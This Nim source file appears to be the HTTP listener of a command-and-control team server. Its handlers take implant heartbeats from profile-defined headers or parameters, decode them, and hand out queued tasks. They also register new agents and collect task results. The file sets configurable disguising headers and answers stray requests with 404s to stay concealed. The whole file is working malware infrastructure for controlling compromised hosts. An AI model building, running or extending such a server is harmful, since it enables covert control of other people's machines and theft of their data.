import prologue, terminal, strformat, parsetoml, tables
import strutils, times, base64

import ./handlers
import ../[utils, globals]
import ../../common/[types, utils, serialize, profile]

proc error404*(ctx: Context) {.async.} = 
    resp "", Http404

#[
    GET
    Called from agent to check for new tasks
]#
proc httpGet*(ctx: Context) {.async.} = 

    {.cast(gcsafe).}:

        # Check heartbeat metadata placement
        var heartbeat: seq[byte]
        var heartbeatString: string

        case cq.profile.getString("http-get.agent.heartbeat.placement.type"): 
        of "header": 
            let heartbeatHeader = cq.profile.getString("http-get.agent.heartbeat.placement.name")
            if not ctx.request.hasHeader(heartbeatHeader): 
                resp "", Http404 
                return

            heartbeatString = ctx.request.getHeader(heartbeatHeader)[0]

        of "parameter": 
            let param = cq.profile.getString("http-get.agent.heartbeat.placement.name")
            heartbeatString = ctx.getQueryParams(param)  
            if heartbeatString.len <= 0: 
                resp "", Http404
                return

        of "uri": 
            discard 
        of "body": 
            discard
        else: discard 

        # Retrieve and apply data transformation to get raw heartbeat packet
        let 
            prefix = cq.profile.getString("http-get.agent.heartbeat.prefix")
            suffix = cq.profile.getString("http-get.agent.heartbeat.suffix")
            encHeartbeat = heartbeatString[len(prefix) ..^ len(suffix) + 1]

        case cq.profile.getString("http-get.agent.heartbeat.encoding.type", default = "none"): 
        of "base64":
            heartbeat = string.toBytes(decode(encHeartbeat)) 
        of "none":
            heartbeat = string.toBytes(encHeartbeat) 

        try: 
            var responseBytes: seq[byte]
            let tasks: seq[seq[byte]] = getTasks(heartbeat)

            if tasks.len <= 0: 
                resp "", Http200
                return

            # Create response, containing number of tasks, as well as length and content of each task
            # This makes it easier for the agent to parse the tasks
            responseBytes.add(cast[uint8](tasks.len))

            for task in tasks:
                responseBytes.add(uint32.toBytes(uint32(task.len))) 
                responseBytes.add(task)
            
            # Apply data transformation to the response
            var response: string

            case cq.profile.getString("http-get.server.output.encoding.type", default = "none"): 
            of "none": 
                response = Bytes.toString(responseBytes)
            of "base64":
                response = encode(responseBytes, safe = cq.profile.getBool("http-get.server.output.encoding.url-safe"))
            else: discard

            let prefix = cq.profile.getString("http-get.server.output.prefix")
            let suffix = cq.profile.getString("http-get.server.output.suffix")

            # Add headers, as defined in the team server profile 
            for header, value in cq.profile.getTable("http-get.server.headers"):
                ctx.response.setHeader(header, value.getStringValue())

            await ctx.respond(Http200, prefix & response & suffix, ctx.response.headers)
            ctx.handled = true # Ensure that HTTP response is sent only once 

            # Notify operator that agent collected tasks
            let date = now().format("dd-MM-yyyy HH:mm:ss")
            cq.writeLine(fgBlack, styleBright, fmt"[{date}] [*] ", resetStyle, fmt"{$response.len} bytes sent.")

        except CatchableError:
            resp "", Http404

#[
    POST 
    Called from agent to register itself or post results of a task
]#
proc httpPost*(ctx: Context) {.async.} = 
    
    {.cast(gcsafe).}:

        # Check headers
        # If POST data is not binary data, return 404 error code
        if ctx.request.contentType != "application/octet-stream": 
            resp "", Http404
            return

        try:        
            # Differentiate between registration and task result packet
            var unpacker = Unpacker.init(ctx.request.body)
            let header = unpacker.deserializeHeader()

            # Add response headers, as defined in team server profile
            for header, value in cq.profile.getTable("http-post.server.headers"):
                ctx.response.setHeader(header, value.getStringValue())

            if cast[PacketType](header.packetType) == MSG_REGISTER: 
                if not register(string.toBytes(ctx.request.body)):
                    resp "", Http400
                    return

            elif cast[PacketType](header.packetType) == MSG_RESULT: 
                handleResult(string.toBytes(ctx.request.body))

            resp "", Http200

        except CatchableError:
            resp "", Http404

        return